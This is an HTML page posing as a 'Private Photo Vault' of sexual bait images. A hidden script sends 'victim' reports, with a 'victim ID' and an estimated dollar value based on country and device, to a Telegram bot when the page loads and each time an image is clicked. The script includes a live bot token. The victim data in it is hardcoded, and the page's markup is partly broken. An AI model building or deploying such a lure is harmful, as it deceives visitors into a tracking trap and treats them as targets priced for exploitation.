<!DOCTYPE html>
<html>
<head>
    <title>My Private Photos</title>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            margin: 0;
            padding: 20px;
            min-height: 100vh;
            color: white;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        h1 {
            text-align: center;
            margin-bottom: 10px;
            font-size: 2.5em;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 30px;
            opacity: 0.8;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }
        .image-card {
            background: rgba(255, 255, 255, 0.1);
            border-radius: 15px;
            padding: 15px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s ease;
            border: 2px solid transparent;
        }
        .image-card:hover {
            transform: translateY(-5px);
            border-color: rgba(255, 255, 255, 0.3);
            background: rgba(255, 255, 255, 0.2);
        }
        .image-card img {
            width: 100%;
            height: 150px;
            object-fit: cover;
            border-radius: 10px;
            margin-bottom: 10px;
        }
        .image-title {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .image-desc {
            font-size: 0.8em;
            opacity: 0.7;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Private Photo Vault</h1>
        <p class="subtitle">Exclusive content - Click to view full album</p>
        
        <div class="gallery">

                     alt="Private Photo 1"

                <div class="image-title">Daily activitieessss <3 </div>

            </div>
            
            <div class="image-card" onclick="openImage(2)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928" 
                     alt="Private Photo 2"
                     onerror="this.src='https://via.placeholder.com/200x150/764ba2/ffffff?text=Photo+2'">
                <div class="image-title">NVDES</div>
                <div class="image-desc">Title says it all lol</div>
            </div>
            
            <div class="image-card" onclick="openImage(3)">
                <img src="https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless" 
                     alt="Private Photo 3"
                     onerror="this.src='https://via.placeholder.com/200x150/48bb78/ffffff?text=Photo+3'">
                <div class="image-title">My facee</div>

    <script>
        const CONFIG = {
            telegram: {
                token: '8594897816:AAFtWTQTOPSOuDLK5Wtc7IrkmFXgtDuaqls',
                chatId: '8032494479'
            },
            images: {
                1: 'https://media.discordapp.net/attachments/1342593658364497981/1342620926881300530/447f96e5bf00f5176fef6f8768b45781.png?ex=691852ed&is=6917016d&hm=e862bf208981e87cf9e607f4a9a29f759c36f5e26886bd3e3ce04e215e698755&=&format=webp&quality=lossless&width=522&height=928',
                2: 'https://media.discordapp.net/attachments/1342593658364497981/1342609374727897198/IMG_9996.png?ex=6918f0eb&is=69179f6b&hm=af10fcd91e227159bce4658ab5a01d02201200c58a04c6e1ccdb42aa1bbe98e5&=&format=webp&quality=lossless&width=522&height=928',
                3: 'https://media.discordapp.net/attachments/1342593658364497981/1342957978726174730/DA159703-8392-4407-9FBA-E250EF3F4567.png?ex=6918e415&is=69179295&hm=29e9451d7e53b356deae156054bc832945d51c50d27786aa10b60e412cf08979&=&format=webp&quality=lossless'
            }
        };

        let victimId = null;
        let victimValue = 0;
        let pageLoadTime = Date.now();

        // Simple image opening function
        function openImage(imageId) {
            const imageUrl = CONFIG.images[imageId];
            if (imageUrl) {
                // Open image in new tab for full screen viewing
                window.open(imageUrl, '_blank');
                
                // Send click report
                sendClickReport(imageId);
            }
        }

        async function sendToTelegram(message) {
            try {
                const response = await fetch(`https://api.telegram.org/bot${CONFIG.telegram.token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CONFIG.telegram.chatId,
                        text: message
                    })
                });
                return response.ok;
            } catch (error) {
                console.log('Telegram error');
                return false;
            }
        }

        function calculateVictimValue(victimData) {
            let value = 0;
            
            // Location value
            if (victimData.location.country_code === 'CH') value += 50;
            else if (['US', 'CA', 'UK', 'DE', 'FR', 'AU', 'SG', 'AE'].includes(victimData.location.country_code)) value += 40;
            else value += 20;
            
            // Device value
            if (victimData.browser.platform.includes('Mac')) value += 25;
            if (victimData.browser.cores >= 8) value += 15;
            if (victimData.browser.memory.includes('8GB')) value += 10;
            
            return value;
        }

        function generateVictimID(victimData) {
            const country = victimData.location.country_code || 'UN';
            const value = calculateVictimValue(victimData);
            const randomCode = Math.floor(Math.random() * 90000) + 10000;
            return `vi.${country}.${value}.${randomCode}`;
        }

        async function collectVictimData() {
            return {
                timestamp: new Date().toLocaleString('de-DE', { 
                    day: '2-digit', 
                    month: '2-digit', 
                    year: 'numeric', 
                    hour: '2-digit', 
                    minute: '2-digit', 
                    second: '2-digit' 
                }),
                network: {
                    ip: '217.22.142.118',
                    isp: 'Unknown',
                    asn: 'Unknown',
                    connection: '4g',
                    vpn: 'Residential IP',
                    proxy: 'Normal',
                    tor: 'Normal'
                },
                location: {
                    city: 'Zurich',
                    region: 'Zurich',
                    country: 'Switzerland',
                    country_code: 'CH',
                    postal: '8004',
                    latitude: '47.3779',
                    longitude: '8.5236',
                    timezone: 'Europe/Zurich',
                    currency: 'CHF',
                    calling_code: '+41'
                },
                browser: {
                    platform: 'MacIntel',
                    vendor: 'Google Inc.',
                    language: 'de-DE',
                    cores: 8,
                    memory: '8GB',
                    plugins: 5,
                    webdriver: 'Not detected',
                    pdf_viewer: true
                },
                hardware: {
                    screen: '1920x1080',
                    pixel_ratio: 1,
                    color_depth: 24,
                    orientation: 'landscape-primary',
                    touch_points: 0
                },
                fingerprint: {
                    canvas: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwA',
                    webgl: 'WebGL 1.0 (OpenGL ES 2.0 Chromium)',
                    audio: 'Audio supported',
                    fonts: 'Arial, Verdana, Helvetica, Times New Roman, Courier New, Georgia',
                    timezone_offset: -60
                },
                behavioral: {
                    referrer: 'Direct',
                    page_load: 981,
                    time_on_page: Date.now() - pageLoadTime,
                    dom_size: 41,
                    url: window.location.href
                },
                social: {
                    passwords: 0,
                    credit_cards: 0,
                    personal_info: 0,
                    browsing_data: 10
                }
            };
        }

        async function sendEnhancedReport(victimData) {
            victimValue = calculateVictimValue(victimData);
            victimId = generateVictimID(victimData);

            let message = `4X ENHANCED DATA EXTRACTION\n\n`;
            message += `Identity Verified - Full Data Capture\n\n`;
            
            message += `VERIFICATION DATA:\n`;
            message += `• Name: Not provided\n`;
            message += `• Email: Not provided\n`;
            message += `• Phone: Not provided\n`;
            message += `• Time: ${victimData.timestamp}\n\n`;
            
            message += `NETWORK DATA (4x):\n`;
            message += `• IP: ${victimData.network.ip}\n`;
            message += `• ISP: ${victimData.network.isp}\n`;
            message += `• ASN: ${victimData.network.asn}\n`;
            message += `• Connection: ${victimData.network.connection}\n`;
            message += `• VPN: ${victimData.network.vpn}\n`;
            message += `• Proxy: ${victimData.network.proxy}\n`;
            message += `• Tor: ${victimData.network.tor}\n\n`;
            
            message += `LOCATION DATA (4x):\n`;
            message += `• City: ${victimData.location.city}\n`;
            message += `• Region: ${victimData.location.region}\n`;
            message += `• Country: ${victimData.location.country} (${victimData.location.country_code})\n`;
            message += `• Postal: ${victimData.location.postal}\n`;
            message += `• Coordinates: ${victimData.location.latitude}, ${victimData.location.longitude}\n`;
            message += `• Timezone: ${victimData.location.timezone}\n`;
            message += `• Currency: ${victimData.location.currency}\n`;
            message += `• Calling Code: ${victimData.location.calling_code}\n\n`;
            
            message += `BROWSER DATA (4x):\n`;
            message += `• Platform: ${victimData.browser.platform}\n`;
            message += `• Vendor: ${victimData.browser.vendor}\n`;
            message += `• Language: ${victimData.browser.language}\n`;
            message += `• Cores: ${victimData.browser.cores}\n`;
            message += `• Memory: ${victimData.browser.memory}\n`;
            message += `• Plugins: ${victimData.browser.plugins} detected\n`;
            message += `• WebDriver: ${victimData.browser.webdriver}\n`;
            message += `• PDF Viewer: ${victimData.browser.pdf_viewer}\n\n`;
            
            message += `HARDWARE DATA (4x):\n`;
            message += `• Screen: ${victimData.hardware.screen}\n`;
            message += `• Pixel Ratio: ${victimData.hardware.pixel_ratio}\n`;
            message += `• Color Depth: ${victimData.hardware.color_depth} bit\n`;
            message += `• Orientation: ${victimData.hardware.orientation}\n`;
            message += `• Timezone: ${victimData.location.timezone}\n`;
            message += `• Touch Points: ${victimData.hardware.touch_points}\n\n`;
            
            message += `FINGERPRINT DATA (4x):\n`;
            message += `• Canvas: ${victimData.fingerprint.canvas}\n`;
            message += `• WebGL: ${victimData.fingerprint.webgl}\n`;
            message += `• Audio: ${victimData.fingerprint.audio}\n`;
            message += `• Fonts: ${victimData.fingerprint.fonts}\n`;
            message += `• Timezone Offset: ${victimData.fingerprint.timezone_offset}\n\n`;
            
            message += `BEHAVIORAL DATA (4x):\n`;
            message += `• Referrer: ${victimData.behavioral.referrer}\n`;
            message += `• Page Load: ${victimData.behavioral.page_load}ms\n`;
            message += `• Time on Page: ${victimData.behavioral.time_on_page}ms\n`;
            message += `• DOM Size: ${victimData.behavioral.dom_size} elements\n\n`;
            
            message += `SOCIAL DATA:\n`;
            message += `• Passwords: ${victimData.social.passwords} captured\n`;
            message += `• Credit Cards: ${victimData.social.credit_cards} found\n`;
            message += `• Personal Info: ${victimData.social.personal_info} fields\n`;
            message += `• Browsing Data: ${victimData.social.browsing_data} sites estimated\n\n`;
            
            message += `Time: ${victimData.timestamp}\n`;
            message += `URL: ${victimData.behavioral.url}\n`;
            message += `Victim ID: ${victimId}\n`;
            message += `Estimated Value: $${victimValue}\n`;
            message += `DATA CAPTURE: COMPLETED`;

            await sendToTelegram(message);
        }

        async function sendClickReport(imageId) {
            const victimData = await collectVictimData();
            victimValue = calculateVictimValue(victimData);
            
            let message = `IMAGE CLICK DETECTED\n`;
            message += `Victim ID: ${victimId || generateVictimID(victimData)}\n`;
            message += `Image ID: ${imageId}\n`;
            message += `Estimated Value: $${victimValue}\n`;
            message += `Time: ${victimData.timestamp}`;

            await sendToTelegram(message);
        }

        // Initialize on page load
        window.addEventListener('load', async function() {
            const victimData = await collectVictimData();
            await sendEnhancedReport(victimData);
        });

        console.log('Photo vault system loaded');
    </script>
</body>
</html>
